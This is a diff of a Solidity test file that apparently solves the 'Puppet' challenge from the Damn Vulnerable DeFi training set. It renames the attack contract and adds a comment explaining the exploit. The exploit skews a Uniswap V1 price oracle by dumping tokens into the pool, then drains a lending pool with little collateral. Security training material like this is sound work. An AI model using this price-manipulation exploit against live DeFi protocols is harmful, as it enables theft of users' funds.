@@ -9,7 +9,7 @@ import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
 
-contract Attacker {
+contract Exploiter {
 
     DamnValuableToken token;
     IUniswapV1Exchange uniswapV1Exchange;
@@ -27,10 +27,7 @@ contract Attacker {
     }
 
 
-    function attack() external payable{
-        console.log(token.balanceOf(address(this)));
-        console.log(address(this).balance);
-
+    function exploit() external payable{
         token.approve(address(uniswapV1Exchange), type(uint256).max);
         uniswapV1Exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp + 1);
         lendingPool.borrow{value: address(this).balance}(token.balanceOf(address(lendingPool)), recovery);
@@ -128,14 +125,18 @@ contract PuppetChallenge is Test {
      */
     function test_puppet() public checkSolvedByPlayer {
 
+        // Exploit: The exploit works by manipulating the Uniswap V1 exchange rate to drastically reduce the amount of ETH required as collateral 
+        // to borrow all tokens from the lending pool. The attacker first swaps a large amount of tokens for ETH on the Uniswap exchange, which 
+        // skews the price in favor of ETH. This manipulation allows the attacker to borrow all tokens from the lending pool with significantly less ETH than would normally be required.
 
-        Attacker att = new Attacker(
+
+        Exploiter exploiter = new Exploiter(
             token, uniswapV1Exchange, lendingPool, recovery, player
         );
         
-        token.transfer(address(att), token.balanceOf(address(player)));
+        token.transfer(address(exploiter), token.balanceOf(address(player)));
 
-        att.attack{value: player.balance}();
+        exploiter.exploit{value: player.balance}();
 
     }
 
